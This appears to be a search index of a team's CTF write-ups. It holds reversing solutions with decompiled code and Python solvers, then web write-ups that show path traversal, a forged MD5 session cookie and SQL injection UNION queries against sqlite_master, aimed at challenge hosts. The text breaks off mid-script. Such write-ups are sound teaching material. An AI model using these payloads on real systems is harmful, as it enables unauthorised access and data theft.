flag[28]=flag[5]+0x2 \"\"\" flag.append(0x36) flag.append(0x38) flag.append(0x36) flag.append(0x34) flag.append(0x3c) flag.append(0x4a) flag.append(0x30) flag.append(0x30) flag.append(0x30) flag.append(0x2e) flag.append(0x31) flag.append(0x31) flag.append(0x31) flag.append(0x31) flag.append(0x2e) flag.append(0x32) flag.append(0x32) flag.append(0x32) flag.append(0x32) flag.append(0x32) flag.append(0x2e) flag.append(0x32+0x1) flag.append(0x2e) flag.append(3) flag.append(4) flag.append(0) flag.append(2) flag.append(1) flag.append(0x4a+0x2) gg=[] for i in flag: g=0 g=i+0x31 gg.append(chr(g)) fl='' fl=''.join(gg) print(fl) We get our flag as the output gigem{aaa_bbbb_ccccc_d_45132}","title":"redo2"},{"location":"reversing/Tamuctf22/redo2/#redo2","text":"","title":"redo2"},{"location":"reversing/Tamuctf22/redo2/#description","text":"Honestly, this is just a plain an simple ASM challenge. Best of luck.","title":"Description"},{"location":"reversing/Tamuctf22/redo2/#solution","text":"Here, we are given an assembly file which is in intel format, so we first convert it into intel by adding a statement in the assembly file - \".intel_syntax noprefix\" After this we compile the file - \"gcc -m32 redo2.S -o redo2\" Observe the binary in binary ninja","title":"Solution"},{"location":"reversing/Tamuctf22/redo2/#script","text":"flag=[] \"\"\" flag[0]=0x36 flag[1]=0x38 flag[2]=0x36 flag[3]=0x34 flag[4]=0x3c flag[5]=0x4a flag[6]=0x30 flag[7]=0x30 flag[8]=0x30 flag[9]=0x2e flag[10]=0x31 flag[11]=0x31 flag[12]=0x31 flag[13]=0x31 flag[14]=0x2e flag[15]=0x32 flag[16]=0x32 flag[17]=0x32 flag[18]=0x32 flag[19]=0x32 flag[20]=0x2e flag[21]=flag[15]+1 flag[22]=0x2e flag[23]=3 flag[24]=4 flag[25]=0 flag[26]=2 flag[27]=1 flag[28]=flag[5]+0x2 \"\"\" flag.append(0x36) flag.append(0x38) flag.append(0x36) flag.append(0x34) flag.append(0x3c) flag.append(0x4a) flag.append(0x30) flag.append(0x30) flag.append(0x30) flag.append(0x2e) flag.append(0x31) flag.append(0x31) flag.append(0x31) flag.append(0x31) flag.append(0x2e) flag.append(0x32) flag.append(0x32) flag.append(0x32) flag.append(0x32) flag.append(0x32) flag.append(0x2e) flag.append(0x32+0x1) flag.append(0x2e) flag.append(3) flag.append(4) flag.append(0) flag.append(2) flag.append(1) flag.append(0x4a+0x2) gg=[] for i in flag: g=0 g=i+0x31 gg.append(chr(g)) fl='' fl=''.join(gg) print(fl) We get our flag as the output gigem{aaa_bbbb_ccccc_d_45132}","title":"Script"},{"location":"reversing/dawgCTF/secret_app/secret_app/","text":"DawgCTF 2021 Secret app(Reversing) Challenge description Challenge file Opening the file in ghidra and going to defined strings from window menu, we can find the strings Please enter username and Please enter password . On going to corresponding functions username is not_username and password is not_password . Going to function just before printing of flag, there our input is getting compared with result of hexdata xored with 0x78. Using simple python code we get flag. hexa=[\"3c\",\"19\",\"0f\",\"1f\",\"3b\",\"2c\",\"3e\",\"03\",\"4c\",\"08\",\"08\",\"27\",\"0b\",\"0d\",\"08\",\"4b\",\"0a\",\"27\",\"4d\",\"4b\",\"1b\",\"0a\",\"1d\",\"0c\",\"05\"] for i in hexa: print(chr(int(i,16)^120),end=\"\") Flag DawgCTF{4pp_sup3r_53cret}","title":"DawgCTF 2021"},{"location":"reversing/dawgCTF/secret_app/secret_app/#dawgctf-2021","text":"","title":"DawgCTF 2021"},{"location":"reversing/dawgCTF/secret_app/secret_app/#secret-appreversing","text":"","title":"Secret app(Reversing)"},{"location":"reversing/dawgCTF/secret_app/secret_app/#challenge-description","text":"Challenge file Opening the file in ghidra and going to defined strings from window menu, we can find the strings Please enter username and Please enter password . On going to corresponding functions username is not_username and password is not_password . Going to function just before printing of flag, there our input is getting compared with result of hexdata xored with 0x78. Using simple python code we get flag. hexa=[\"3c\",\"19\",\"0f\",\"1f\",\"3b\",\"2c\",\"3e\",\"03\",\"4c\",\"08\",\"08\",\"27\",\"0b\",\"0d\",\"08\",\"4b\",\"0a\",\"27\",\"4d\",\"4b\",\"1b\",\"0a\",\"1d\",\"0c\",\"05\"] for i in hexa: print(chr(int(i,16)^120),end=\"\")","title":"Challenge description"},{"location":"reversing/dawgCTF/secret_app/secret_app/#flag","text":"DawgCTF{4pp_sup3r_53cret}","title":"Flag"},{"location":"reversing/kalmarctf23/cyclechaser/solution/","text":"cyclechaser (kalmarCTF) Initial Triage Let's first analyze the challenge statically. The process generates a 4 byte number via the function getrandom() and this random number is then used as the seed for srand() function. The getrandom() function is then used second time to generate 1024 random bytes. Next there is an attempt to open flag.txt which is already present in the server and we aim to recover the contents of this file. The content of flag.txt is checked against the flag format and the part of the flag without the flag format is saved to be used in further functions. There are further checks for the saved part of the flag.txt Thereafter the program also takes our input which is 16393 bytes long. Initial Approach Since a lot of things are going on in this challenge, it was difficult to point out at what approach would be best to take. Running the challenge first prints out the seed used for srand function, I felt that whatever function or part of code is using rand() function might be of high importance. In this section we have got a really large for loop which runs 131135 times. The final output that we get is v17 which is changed according to the value of v5 variable, which is in turn being changed based on the condition if ( j > 0x1FFFF ) My initial approach was to extract all the rand() values based on the seed and then somehow try to get the flag bytes which are originally v15 in this section. Let's make the decompilation more clear for better understanding. The else part of the above conditional statement involves those random bytes which are generated via the getrandom() function, hence those can't be predicted easily. So that makes it kind of tedious to determine the output if the else section is executed. Right Hunch This made me realize that what if I don't even let that else part to play any role in my output. This is where the role of step function comes in. Until now I haven't checked out step function properly but just skimmed over. Here v4 needs to be 1 in order to the function to return true, which is when the output will be changed based on the v5 calculated earlier in the previous loop. In order to make v4 1 we need the first byte of our input to be an odd byte. But our trouble doesn't ends here, if we look further we could see that our input is being shifted. That means for everytime the step function is called, the first byte of our input is different. The shifting that is taking place here is left shift by one byte along with few more calculations which I actually didn't bother to reverse right now. So if we go back to the main function, I get an awesome hunch that if the step function returns 0 131072 times and then returns 1 for the rest of the iterations, we might get the flag bytes as it is printed out. Since output is initialized to be zero and continues to remain zero until the iteration number reaches 131072, v5 is directly assigned with the flag bytes which are xorred with the output bytes itself hence giving out the flag itself. But now we need to figure out what input will make this happen. I tried analysing the output of the same function with different inputs to find any pattern if it exists. The pattern that I observed was this - #include <stdlib.h> #include <stdio.h> int step(char *a1, int a2) { char v3 = 0; unsigned int v4 ; int v8 = 0; unsigned int v9 = 0; uint i; int j; v4 = *a1 & 1; if (v4) { v8 = 1; for (i = 0; i < a2; ++i) { v9 = v8 + 3 * a1[i]; v8 = v9 >> 8; a1[i] = v9; } if (v8) { puts(\"Error.\"); exit(99); } } for (j = a2 - 1; j >= 0; --j) { char v5 = a1[j] & 1; a1[j] >>= 1; a1[j] |= v3 << 7; v3 = v5; } if (v3) printf(\"error\\n\"); return v4; } int main() { char inp[] = \"\\x00\\x00\\x00\\x00\\xaa\\xaa\\xaa\\xaa\"; for (int i = 0; i < 70; ++i) { printf(\"%d \", step(inp, 10)); } return 0; } This returns - For every null byte it returns '0' 8 times and thus since I provided 4 null bytes, it gave me 32 zeros and then 1's because of '\\xaa' So since we need to pass the step function 131072 times, which is perfectly divisible by 8 to be 16384, we provide '16384' null bytes and rest some non-null bytes. Solve script from pwn import * yy = b'\\x00' zz= b'\\xff' x = yy*16384+zz*9 io = remote('3.123.91.129',13339) print('seed', io.recvline()) io.sendline(x) ret = io.recvline() print(ret) io.close() This returns - Which forms the flag - python= f='69 5F 73 74 69 6C 6C 5F 68 61 76 65 5F 74 6F 5F 63 6F 6E 73 74 72 75 63 74 5F 61 5F 66 6C 61 67 5F 6F 66 5F 63 6F 72 72 65 63 74 5F 6C 65 6E 67 74 68 5F 66 6F 72 5F 74 68 69 73 5F 63 68 61 6C'.split(' ') for i in f: print(chr(int(i,16)),end='') Output - i_still_have_to_construct_a_flag_of_correct_length_for_this_chal Flag - kalmar{i_still_have_to_construct_a_flag_of_correct_length_for_this_chal}","title":"cyclechaser (kalmarCTF)"},{"location":"reversing/kalmarctf23/cyclechaser/solution/#cyclechaser-kalmarctf","text":"","title":"cyclechaser (kalmarCTF)"},{"location":"reversing/kalmarctf23/cyclechaser/solution/#initial-triage","text":"Let's first analyze the challenge statically. The process generates a 4 byte number via the function getrandom() and this random number is then used as the seed for srand() function. The getrandom() function is then used second time to generate 1024 random bytes. Next there is an attempt to open flag.txt which is already present in the server and we aim to recover the contents of this file. The content of flag.txt is checked against the flag format and the part of the flag without the flag format is saved to be used in further functions. There are further checks for the saved part of the flag.txt Thereafter the program also takes our input which is 16393 bytes long.","title":"Initial Triage"},{"location":"reversing/kalmarctf23/cyclechaser/solution/#initial-approach","text":"Since a lot of things are going on in this challenge, it was difficult to point out at what approach would be best to take. Running the challenge first prints out the seed used for srand function, I felt that whatever function or part of code is using rand() function might be of high importance. In this section we have got a really large for loop which runs 131135 times. The final output that we get is v17 which is changed according to the value of v5 variable, which is in turn being changed based on the condition if ( j > 0x1FFFF ) My initial approach was to extract all the rand() values based on the seed and then somehow try to get the flag bytes which are originally v15 in this section. Let's make the decompilation more clear for better understanding. The else part of the above conditional statement involves those random bytes which are generated via the getrandom() function, hence those can't be predicted easily. So that makes it kind of tedious to determine the output if the else section is executed.","title":"Initial Approach"},{"location":"reversing/kalmarctf23/cyclechaser/solution/#right-hunch","text":"This made me realize that what if I don't even let that else part to play any role in my output. This is where the role of step function comes in. Until now I haven't checked out step function properly but just skimmed over. Here v4 needs to be 1 in order to the function to return true, which is when the output will be changed based on the v5 calculated earlier in the previous loop. In order to make v4 1 we need the first byte of our input to be an odd byte. But our trouble doesn't ends here, if we look further we could see that our input is being shifted. That means for everytime the step function is called, the first byte of our input is different. The shifting that is taking place here is left shift by one byte along with few more calculations which I actually didn't bother to reverse right now. So if we go back to the main function, I get an awesome hunch that if the step function returns 0 131072 times and then returns 1 for the rest of the iterations, we might get the flag bytes as it is printed out. Since output is initialized to be zero and continues to remain zero until the iteration number reaches 131072, v5 is directly assigned with the flag bytes which are xorred with the output bytes itself hence giving out the flag itself. But now we need to figure out what input will make this happen. I tried analysing the output of the same function with different inputs to find any pattern if it exists. The pattern that I observed was this - #include <stdlib.h> #include <stdio.h> int step(char *a1, int a2) { char v3 = 0; unsigned int v4 ; int v8 = 0; unsigned int v9 = 0; uint i; int j; v4 = *a1 & 1; if (v4) { v8 = 1; for (i = 0; i < a2; ++i) { v9 = v8 + 3 * a1[i]; v8 = v9 >> 8; a1[i] = v9; } if (v8) { puts(\"Error.\"); exit(99); } } for (j = a2 - 1; j >= 0; --j) { char v5 = a1[j] & 1; a1[j] >>= 1; a1[j] |= v3 << 7; v3 = v5; } if (v3) printf(\"error\\n\"); return v4; } int main() { char inp[] = \"\\x00\\x00\\x00\\x00\\xaa\\xaa\\xaa\\xaa\"; for (int i = 0; i < 70; ++i) { printf(\"%d \", step(inp, 10)); } return 0; } This returns - For every null byte it returns '0' 8 times and thus since I provided 4 null bytes, it gave me 32 zeros and then 1's because of '\\xaa' So since we need to pass the step function 131072 times, which is perfectly divisible by 8 to be 16384, we provide '16384' null bytes and rest some non-null bytes.","title":"Right Hunch"},{"location":"reversing/kalmarctf23/cyclechaser/solution/#solve-script","text":"from pwn import * yy = b'\\x00' zz= b'\\xff' x = yy*16384+zz*9 io = remote('3.123.91.129',13339) print('seed', io.recvline()) io.sendline(x) ret = io.recvline() print(ret) io.close() This returns - Which forms the flag - python= f='69 5F 73 74 69 6C 6C 5F 68 61 76 65 5F 74 6F 5F 63 6F 6E 73 74 72 75 63 74 5F 61 5F 66 6C 61 67 5F 6F 66 5F 63 6F 72 72 65 63 74 5F 6C 65 6E 67 74 68 5F 66 6F 72 5F 74 68 69 73 5F 63 68 61 6C'.split(' ') for i in f: print(chr(int(i,16)),end='') Output - i_still_have_to_construct_a_flag_of_correct_length_for_this_chal","title":"Solve script"},{"location":"reversing/kalmarctf23/cyclechaser/solution/#flag-","text":"kalmar{i_still_have_to_construct_a_flag_of_correct_length_for_this_chal}","title":"Flag -"},{"location":"reversing/tamuCTF/astronomy/","text":"setecAstronomy Reverse the operations given. def xx(a, b): l=[] for i in range(len(a)): l.append(str(int(a[i])^int(b[i]))) return l out = \"11001010011011101100110001011000111110101010111000001100011101101111100001111010001000100110000011100100100110001110000001111101\" phoenix = list(out) ph = phoenix[::-1] abbott = ph[0:32] cosmo = ph[32:64] ayk0 = ph[64:96] earl = ph[96:128] ayk64 = xx(earl,ayk0) ayk96 = xx(cosmo,ayk64) ayk32 = xx(abbott,ayk96) ayk = ayk0 + ayk32 + ayk64 + ayk96 ayk[95:99], ayk[81:85] = ayk[81:85], ayk[95:99] ayk[63:71], ayk[120:128] = ayk[120:128], ayk[63:71] ayk[54:62], ayk[32:40] = ayk[32:40], ayk[54:62] ayk[3:7], ayk[19:23] = ayk[19:23], ayk[3:7] in0 = ayk[0:32] dave = ayk[32:64] red = ayk[64:96] king = ayk[96:128] in96 = xx(red, in0) in64 = xx(dave, in96) in32 = xx(king, in64) final = in0 + in32 + in64 + in96 print(\"\".join(final)) Output string: 01110100001100000110111101011111010011010011010001101110010110010101111101110011001100110110001101010010001100110111010001010011 Decoding it gives t0o_M4nY_s3cR3tS Flag: gigem{t0o_M4nY_s3cR3tS}","title":"Astronomy"},{"location":"reversing/tamuCTF/astronomy/#setecastronomy","text":"Reverse the operations given. def xx(a, b): l=[] for i in range(len(a)): l.append(str(int(a[i])^int(b[i]))) return l out = \"11001010011011101100110001011000111110101010111000001100011101101111100001111010001000100110000011100100100110001110000001111101\" phoenix = list(out) ph = phoenix[::-1] abbott = ph[0:32] cosmo = ph[32:64] ayk0 = ph[64:96] earl = ph[96:128] ayk64 = xx(earl,ayk0) ayk96 = xx(cosmo,ayk64) ayk32 = xx(abbott,ayk96) ayk = ayk0 + ayk32 + ayk64 + ayk96 ayk[95:99], ayk[81:85] = ayk[81:85], ayk[95:99] ayk[63:71], ayk[120:128] = ayk[120:128], ayk[63:71] ayk[54:62], ayk[32:40] = ayk[32:40], ayk[54:62] ayk[3:7], ayk[19:23] = ayk[19:23], ayk[3:7] in0 = ayk[0:32] dave = ayk[32:64] red = ayk[64:96] king = ayk[96:128] in96 = xx(red, in0) in64 = xx(dave, in96) in32 = xx(king, in64) final = in0 + in32 + in64 + in96 print(\"\".join(final)) Output string: 01110100001100000110111101011111010011010011010001101110010110010101111101110011001100110110001101010010001100110111010001010011 Decoding it gives t0o_M4nY_s3cR3tS Flag: gigem{t0o_M4nY_s3cR3tS}","title":"setecAstronomy"},{"location":"reversing/tamuCTF/cipher/","text":"Simple_cipher points : 150 Description: We have a flag encrypted using this program. Can you figure out what it is? Writeup The challenge is basically a xoring challenge where random numbers gets xored with the input to form the encrypted key provided in the file named flag.enc Going through the debuggers , we can see that there is a call of :srand(0x1337) The srand() function sets the starting point for for the production of random numbers . It also got two xoring operations .Hence xoring with the random numbers and the data from the flag.enc to get the flag Solution Script import random from ctypes import CDLL libc = CDLL(\"libc.so.6\") libc.srand(0x1337) f=open('flag.enc','rb') X=[] while(True): c=f.read(1) if not c: break b = int.from_bytes(c, byteorder='big') M=hex(b^libc.rand()^libc.rand()).strip()[-2:] X.append(chr(int(M,16))) print(''.join(X)) Flag:gigem{d0n7_wr173_y0ur_0wn_c1ph3r5}","title":"Simple_cipher"},{"location":"reversing/tamuCTF/cipher/#simple_cipher","text":"","title":"Simple_cipher"},{"location":"reversing/tamuCTF/cipher/#points-150","text":"","title":"points : 150"},{"location":"reversing/tamuCTF/cipher/#description","text":"We have a flag encrypted using this program. Can you figure out what it is?","title":"Description:"},{"location":"reversing/tamuCTF/cipher/#writeup","text":"The challenge is basically a xoring challenge where random numbers gets xored with the input to form the encrypted key provided in the file named flag.enc Going through the debuggers , we can see that there is a call of :srand(0x1337) The srand() function sets the starting point for for the production of random numbers . It also got two xoring operations .Hence xoring with the random numbers and the data from the flag.enc to get the flag","title":"Writeup"},{"location":"reversing/tamuCTF/cipher/#solution-script","text":"import random from ctypes import CDLL libc = CDLL(\"libc.so.6\") libc.srand(0x1337) f=open('flag.enc','rb') X=[] while(True): c=f.read(1) if not c: break b = int.from_bytes(c, byteorder='big') M=hex(b^libc.rand()^libc.rand()).strip()[-2:] X.append(chr(int(M,16))) print(''.join(X)) Flag:gigem{d0n7_wr173_y0ur_0wn_c1ph3r5}","title":"Solution Script"},{"location":"reversing/zh3r0CTF/babyrev/","text":"zh3r0-ctf 2021 babyre - Reversing Description !(https://github.com/revathi2001/files-required-for-writeups/blob/main/Selection_174.png) Its BabyRE, you should be able to solve it without angr. even the stego guys solved this. Solution Opening file in ghidra we can see strings CORRECT PASSWORD and INCORRECT PASSWORD , going to corresponding function we can see following code. void FUN_00101600(undefined8 param_1,undefined4 param_2,int param_3,undefined8 param_4) { long lVar1; undefined8 uVar2; wattr_on(param_1,0x80000,0); lVar1 = FUN_00101560(param_4); if (lVar1 == 0) { wattr_on(param_1,0x100,0); mvwprintw(param_1,param_2,param_3 + 2,\" CORRECT PASSWORD \"); uVar2 = 0x100; } else { wattr_on(param_1,0x400,0); mvwprintw(param_1,param_2,param_3 + 2,\"INCORRECT PASSWORD\"); uVar2 = 0x400; } wattr_off(param_1,uVar2,0); return; } In the above code our input is passed to FUN_00101560 and if return value is zero CORRECT PASSWORD is printed. long FUN_00101560(char *param_1) { int iVar1; size_t sVar2; long lVar3; undefined8 uVar4; undefined8 *puVar5; undefined8 *puVar6; long in_FS_OFFSET; undefined local_58 [16]; undefined local_48 [16]; undefined8 local_38; long local_30; local_30 = *(long *)(in_FS_OFFSET + 0x28); local_58 = (undefined [16])0x0; local_48 = (undefined [16])0x0; sVar2 = strlen(param_1); lVar3 = 1; if (sVar2 == 0x20) { puVar5 = (undefined8 *)local_58; do { puVar6 = puVar5 + 1; uVar4 = FUN_001014d0(param_1); *puVar5 = uVar4; param_1 = param_1 + 8; puVar5 = puVar6; } while (puVar6 != &local_38); iVar1 = memcmp(local_58,&DAT_00104020,0x20); lVar3 = (long)iVar1; } if (local_30 == *(long *)(in_FS_OFFSET + 0x28)) { return lVar3; } /* WARNING: Subroutine does not return */ __stack_chk_fail(); } In the above function our input is splitted into 4 parts and passed to FUN_001014d0 . long FUN_001014d0(long param_1) { long *plVar1; long *plVar2; ulong uVar3; long lVar4; long in_FS_OFFSET; undefined8 local_18; long local_10 [2]; lVar4 = 0; local_18._0_1_ = 0; local_10[0] = *(long *)(in_FS_OFFSET + 0x28); local_18 = 0; while( true ) { plVar1 = &local_18; uVar3 = (ulong)*(byte *)(param_1 + lVar4); while( true ) { plVar2 = (long *)((long)plVar1 + 1); *(byte *)plVar1 = (byte)(((uint)uVar3 & 1) << ((byte)lVar4 & 0x1f)) | (byte)local_18; if (local_10 == plVar2) break; local_18._0_1_ = *(byte *)plVar2; plVar1 = plVar2; uVar3 = uVar3 >> 1; } lVar4 = lVar4 + 1; if (lVar4 == 8) break; } if (local_10[0] == *(long *)(in_FS_OFFSET + 0x28)) { return local_18; } /* WARNING: Subroutine does not return */ __stack_chk_fail(); } The above function is converted to python code as follows. x=bytes.fromhex(\"a4adc0a3fd7fab00e8d5e248dabffd00d140f2c47bbf76008707d5adae82fd00\") flag = [0]*32 for i in range(4): x1=x[(i*8):(i*8)+8] for k,st in enumerate(x1): for j in range(8): flag[i*8+j] |= ((st>>j) & 1) << k print(\"\".join([chr(x) for x in flag])) Flag zh3r0{4_b4byre_w1th0ut_-O3_XDXD}","title":"Babyrev"},{"location":"reversing/zh3r0CTF/babyrev/#zh3r0-ctf-2021","text":"","title":"zh3r0-ctf 2021"},{"location":"reversing/zh3r0CTF/babyrev/#babyre-reversing","text":"","title":"babyre - Reversing"},{"location":"reversing/zh3r0CTF/babyrev/#description","text":"!(https://github.com/revathi2001/files-required-for-writeups/blob/main/Selection_174.png) Its BabyRE, you should be able to solve it without angr. even the stego guys solved this.","title":"Description"},{"location":"reversing/zh3r0CTF/babyrev/#solution","text":"Opening file in ghidra we can see strings CORRECT PASSWORD and INCORRECT PASSWORD , going to corresponding function we can see following code. void FUN_00101600(undefined8 param_1,undefined4 param_2,int param_3,undefined8 param_4) { long lVar1; undefined8 uVar2; wattr_on(param_1,0x80000,0); lVar1 = FUN_00101560(param_4); if (lVar1 == 0) { wattr_on(param_1,0x100,0); mvwprintw(param_1,param_2,param_3 + 2,\" CORRECT PASSWORD \"); uVar2 = 0x100; } else { wattr_on(param_1,0x400,0); mvwprintw(param_1,param_2,param_3 + 2,\"INCORRECT PASSWORD\"); uVar2 = 0x400; } wattr_off(param_1,uVar2,0); return; } In the above code our input is passed to FUN_00101560 and if return value is zero CORRECT PASSWORD is printed. long FUN_00101560(char *param_1) { int iVar1; size_t sVar2; long lVar3; undefined8 uVar4; undefined8 *puVar5; undefined8 *puVar6; long in_FS_OFFSET; undefined local_58 [16]; undefined local_48 [16]; undefined8 local_38; long local_30; local_30 = *(long *)(in_FS_OFFSET + 0x28); local_58 = (undefined [16])0x0; local_48 = (undefined [16])0x0; sVar2 = strlen(param_1); lVar3 = 1; if (sVar2 == 0x20) { puVar5 = (undefined8 *)local_58; do { puVar6 = puVar5 + 1; uVar4 = FUN_001014d0(param_1); *puVar5 = uVar4; param_1 = param_1 + 8; puVar5 = puVar6; } while (puVar6 != &local_38); iVar1 = memcmp(local_58,&DAT_00104020,0x20); lVar3 = (long)iVar1; } if (local_30 == *(long *)(in_FS_OFFSET + 0x28)) { return lVar3; } /* WARNING: Subroutine does not return */ __stack_chk_fail(); } In the above function our input is splitted into 4 parts and passed to FUN_001014d0 . long FUN_001014d0(long param_1) { long *plVar1; long *plVar2; ulong uVar3; long lVar4; long in_FS_OFFSET; undefined8 local_18; long local_10 [2]; lVar4 = 0; local_18._0_1_ = 0; local_10[0] = *(long *)(in_FS_OFFSET + 0x28); local_18 = 0; while( true ) { plVar1 = &local_18; uVar3 = (ulong)*(byte *)(param_1 + lVar4); while( true ) { plVar2 = (long *)((long)plVar1 + 1); *(byte *)plVar1 = (byte)(((uint)uVar3 & 1) << ((byte)lVar4 & 0x1f)) | (byte)local_18; if (local_10 == plVar2) break; local_18._0_1_ = *(byte *)plVar2; plVar1 = plVar2; uVar3 = uVar3 >> 1; } lVar4 = lVar4 + 1; if (lVar4 == 8) break; } if (local_10[0] == *(long *)(in_FS_OFFSET + 0x28)) { return local_18; } /* WARNING: Subroutine does not return */ __stack_chk_fail(); } The above function is converted to python code as follows. x=bytes.fromhex(\"a4adc0a3fd7fab00e8d5e248dabffd00d140f2c47bbf76008707d5adae82fd00\") flag = [0]*32 for i in range(4): x1=x[(i*8):(i*8)+8] for k,st in enumerate(x1): for j in range(8): flag[i*8+j] |= ((st>>j) & 1) << k print(\"\".join([chr(x) for x in flag]))","title":"Solution"},{"location":"reversing/zh3r0CTF/babyrev/#flag","text":"zh3r0{4_b4byre_w1th0ut_-O3_XDXD}","title":"Flag"},{"location":"reversing/zh3r0CTF/trace/","text":"Eat Sleep Trace Repeat Script: def func1(a): o = \"\" # & 0xffffffffffffffff is used to convert integer to 64 bit(8 bytes) b = (((a >> 0xc) & 0xffffffffffffffff) ^ a) & 0xffffffffffffffff c = (((b << 0x19) & 0xffffffffffffffff) ^ b) & 0xffffffffffffffff d = (((c >> 0x1b) & 0xffffffffffffffff) ^ c) & 0xffffffffffffffff out = d * 0x2545f4914f6cdd1d out = out & 0xffffffffffffffff arr.append(chr(out & 0xff)) return d arr = [] inp = 0x41424344 for i in range(0x800): inp = func1(inp) inp = inp & 0xffffffffffffffff chall_file = open('trace.txt', 'r') lines = chall_file.readlines() l1 = [] for line in lines: l1.append(line.split(' : ')[0]) index = [] cnt = 0 for i in l1: if (i == \"0x401122\"): cnt = cnt + 1 if(i == \"0x401130\"): index.append(cnt) cnt = 0 flag = \"\" for i in index: flag = flag + arr[i-1] print(flag) Flag: zh3r0{d1d_y0u_enjoyed_r3v3rs1ng_w1th0ut_b1n4ry_?}","title":"Trace"},{"location":"reversing/zh3r0CTF/trace/#eat-sleep-trace-repeat","text":"Script: def func1(a): o = \"\" # & 0xffffffffffffffff is used to convert integer to 64 bit(8 bytes) b = (((a >> 0xc) & 0xffffffffffffffff) ^ a) & 0xffffffffffffffff c = (((b << 0x19) & 0xffffffffffffffff) ^ b) & 0xffffffffffffffff d = (((c >> 0x1b) & 0xffffffffffffffff) ^ c) & 0xffffffffffffffff out = d * 0x2545f4914f6cdd1d out = out & 0xffffffffffffffff arr.append(chr(out & 0xff)) return d arr = [] inp = 0x41424344 for i in range(0x800): inp = func1(inp) inp = inp & 0xffffffffffffffff chall_file = open('trace.txt', 'r') lines = chall_file.readlines() l1 = [] for line in lines: l1.append(line.split(' : ')[0]) index = [] cnt = 0 for i in l1: if (i == \"0x401122\"): cnt = cnt + 1 if(i == \"0x401130\"): index.append(cnt) cnt = 0 flag = \"\" for i in index: flag = flag + arr[i-1] print(flag) Flag: zh3r0{d1d_y0u_enjoyed_r3v3rs1ng_w1th0ut_b1n4ry_?}","title":"Eat Sleep Trace Repeat"},{"location":"web/intro/","text":"Web Exploitaion Introduction \"Write about Web Exploitation and about the writeups\" The contents of this repo This repo contains the writeups of varoius challenges from CTFs we have attempted. Dawg CTF 2020 FreeWifi 2 BlueHens CTF 2021 speedrun-1 - Sivakami Praveen speedrun-2 - Sivakami Praveen Speedrun- 3 - Aiswarya Nair beautiful TAMUctf 2021 uphpload - Sivakami Praveen API 2 : The SeQueL - Aiswarya Nair & Srividhya Vasanth redpwnCTF 2021 orm-bad - Sivakami Praveen pastebin-1 - Sivakami Praveen secure - Sivakami Praveen","title":"Web Exploitaion"},{"location":"web/intro/#web-exploitaion","text":"","title":"Web Exploitaion"},{"location":"web/intro/#introduction","text":"\"Write about Web Exploitation and about the writeups\"","title":"Introduction"},{"location":"web/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from CTFs we have attempted. Dawg CTF 2020 FreeWifi 2 BlueHens CTF 2021 speedrun-1 - Sivakami Praveen speedrun-2 - Sivakami Praveen Speedrun- 3 - Aiswarya Nair beautiful TAMUctf 2021 uphpload - Sivakami Praveen API 2 : The SeQueL - Aiswarya Nair & Srividhya Vasanth redpwnCTF 2021 orm-bad - Sivakami Praveen pastebin-1 - Sivakami Praveen secure - Sivakami Praveen","title":"The contents of this repo"},{"location":"web/BlueHensCTF2021/ctfvc/","text":"BlueHens CTF CTFVC - Web When we first visit the url we see a PHP code written It is passing a file as a query parameter and might be a directory traveral attack.So this must be an exposed git repository attack. Using https://github.com/internetwache/GitTools Dumper and Extractor scripts we can extract the one commit, and looking at the metadata we are not given access to the directory \"1a2220dd8c13c32e\" in the version control system. VC stands for version control On passing this in the url ?file=/1a2220dd8c13c32e/flag.txt we get the flag UDCTF{h4h4_suck3rs_i_t0tally_l0ck3d_th1s_down}","title":"BlueHens CTF"},{"location":"web/BlueHensCTF2021/ctfvc/#bluehens-ctf","text":"","title":"BlueHens CTF"},{"location":"web/BlueHensCTF2021/ctfvc/#ctfvc-web","text":"When we first visit the url we see a PHP code written It is passing a file as a query parameter and might be a directory traveral attack.So this must be an exposed git repository attack. Using https://github.com/internetwache/GitTools Dumper and Extractor scripts we can extract the one commit, and looking at the metadata we are not given access to the directory \"1a2220dd8c13c32e\" in the version control system. VC stands for version control On passing this in the url ?file=/1a2220dd8c13c32e/flag.txt we get the flag UDCTF{h4h4_suck3rs_i_t0tally_l0ck3d_th1s_down}","title":"CTFVC - Web"},{"location":"web/BlueHensCTF2021/speedrun-1/sp1/","text":"speedrun-1 Description Solution When we visit the url we find this static page that just says hello User 2 We notice there is a session cookie. PHPSESSID is generally produced using MD5. c81e728d9d4c2f636f067f89cc14862c is the MD5 hash of 2 . Let's try changing the value. MD5(1) = c4ca4238a0b923820dcc509a6f75849b This gave us the flag:","title":"speedrun-1"},{"location":"web/BlueHensCTF2021/speedrun-1/sp1/#speedrun-1","text":"","title":"speedrun-1"},{"location":"web/BlueHensCTF2021/speedrun-1/sp1/#description","text":"","title":"Description"},{"location":"web/BlueHensCTF2021/speedrun-1/sp1/#solution","text":"When we visit the url we find this static page that just says hello User 2 We notice there is a session cookie. PHPSESSID is generally produced using MD5. c81e728d9d4c2f636f067f89cc14862c is the MD5 hash of 2 . Let's try changing the value. MD5(1) = c4ca4238a0b923820dcc509a6f75849b This gave us the flag:","title":"Solution"},{"location":"web/BlueHensCTF2021/speedrun-2/sp2/","text":"speedrun-2 Description Solution Looking at the script it is obvious this is an SQLi. The course table does not seem to contain any values useful to us. Let's try searching for other tables: http://challenges.ctfd.io:30026/?credits=1+union+select+1,2,3,tbl_name+FROM+sqlite_master We notice there is table flag_xor_shares that looks interesting. Lets try viewing the structure of the table: http://challenges.ctfd.io:30026/?credits=1+union+select+1,2,3,sql+FROM+sqlite_master+where+name=%27flag_xor_shares%27 http://challenges.ctfd.io:30026/?credits=1+union+select+id,hexdigest,3,4+from+flag_xor_shares The contents of the table are secret shares. XORing them together should give us the flag. I wrote a quick script for this from pwn import xor KEY1 = bytes.fromhex(\"7419ccad9d5949e66614cd9458cdac149c2ad981c9f3ec56d30d03e730631c23598394a6055c55ecb5bec49dd0043b9fde76\") KEY2 = bytes.fromhex(\"835db37484676a462e223024a365c91fcdfe53ff975852abfacb79e0f3aef8d5b897a36c6fbfde9ca8e63b3ee00d3a1830f1\") key3 = bytes.fromhex(\"9c5890b6230771372122e9352ed1f3a1f644c9d4e451b81cb2f6643a067669972dc6a06617eaf08e539ada9a92b713b09b0c\") key4 = bytes.fromhex(\"53e5553b467e4badfcee4d97262445b27cdad3ced69a7fc69e0a04196685a61052cdd2f8a7a9650a0d861707f51403ccebc3\") key5 = bytes.fromhex(\"6dbdf9003a3c710afbc92a669f248c6fbe15fc550753264477436a5093614a2efc76310bb7906c911c305a0a39f566c8fc35\") flag = 